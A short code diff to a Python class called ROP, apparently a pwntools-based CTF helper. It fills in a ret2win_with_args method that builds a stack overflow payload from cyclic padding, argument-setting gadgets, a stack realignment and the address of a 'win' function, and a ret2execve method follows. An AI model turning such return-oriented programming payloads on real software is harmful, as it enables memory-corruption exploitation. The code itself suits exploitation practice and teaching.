@@ -48,8 +48,13 @@ class ROP:
         
         return payload
     
-    def ret2win_with_args():
-        pass
+    def ret2win_with_args(self):
+        payload = cyclic(self.offset)
+        payload += self.satisfy_win()
+        payload += self.realign()
+        payload += p64(self.e.sym['win'])
+
+        return payload
 
     def ret2execve(self):
         payload = cyclic(self.offset)
